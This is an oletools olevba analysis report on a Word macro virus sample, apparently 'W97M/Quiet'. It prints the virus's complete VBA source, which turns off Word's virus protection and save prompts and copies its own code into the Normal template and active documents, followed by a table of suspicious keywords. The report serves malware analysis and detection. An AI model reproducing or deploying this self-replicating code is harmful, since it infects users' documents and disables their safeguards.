olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chameleon.c
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Chameleon.c 
in file: Virus.MSWord.Chameleon.c - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' W97M/Quiet
'    by: Total Konfuzion
Set mw=WScript.CreateObject("Word.Application")
Set nt=mw.NormalTemplate.VBProject.VBComponents(1).CodeModule
nt.AddFromFile("C:\Windows\System\Quiet.dll")
mw.Options.VirusProtection = (Rnd * 0)
mw.Options.ConfirmConversions = (Rnd * 0)
mw.Options.SaveNormalPrompt = (Rnd * 0)
mw.Options.SavePropertiesPrompt = (Rnd * 0)
nt.InsertLines 16,"If ThisDocument=ActiveDocument Then Set i=NormalTemplate Else Set i=ActiveDocument"
nt.InsertLines 17,"Vx=ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1,ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)"
nt.InsertLines 18,"Set d=i.VBProject.VBComponents.Item(1).CodeModule"
nt.InsertLines 19,"d.DeleteLines 1,d.CountOfLines"
nt.InsertLines 20,"d.AddFromString Vx"
nt.InsertLines 21,"ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 16, 7"
nt.InsertLines 22,"ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Quiet.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

